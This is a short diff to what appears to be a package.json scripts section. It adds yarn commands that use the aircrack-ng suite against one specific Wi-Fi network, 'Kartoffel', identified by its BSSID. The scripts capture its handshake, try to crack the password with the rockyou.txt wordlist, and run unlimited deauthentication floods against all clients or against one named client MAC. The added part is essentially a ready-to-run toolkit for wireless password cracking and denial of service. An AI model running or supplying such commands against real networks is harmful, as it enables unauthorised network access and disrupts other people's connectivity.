@@ -13,6 +13,10 @@
     "managed" : "yarn down && sudo iw dev wlxc83a35ca40e1 set type managed && yarn up", 
     "monitor" : "yarn down && sudo iw dev wlxc83a35ca40e1 set type monitor && yarn up",
     "sniff" : "sudo airodump-ng wlxc83a35ca40e1",
-    "capture": "sudo airodump-ng --bssid 0E:B8:F4:FF:3B:A7 -c 11 -w capture wlxc83a35ca40e1"
+    "capture": "sudo airodump-ng --bssid D4:24:DD:16:15:AF -c 1 -w ./captures/capture-of-Kartoffel-01.cap wlxc83a35ca40e1",
+    "verify": "sudo aircrack-ng ./captures/capture-of-Kartoffel-01.cap",
+    "try-to-crack": "sudo aircrack-ng -w ./password-lists/rockyou.txt ./captures/capture-of-Kartoffel-01.cap",
+    "deauth-all": "sudo aireplay-ng --deauth 0 -a D4:24:DD:16:15:AF wlxc83a35ca40e1",
+    "deauth-client": "sudo aireplay-ng --deauth 0 -a D4:24:DD:16:15:AF -c 32:70:24:14:E3:92 wlxc83a35ca40e1"
   }
 }
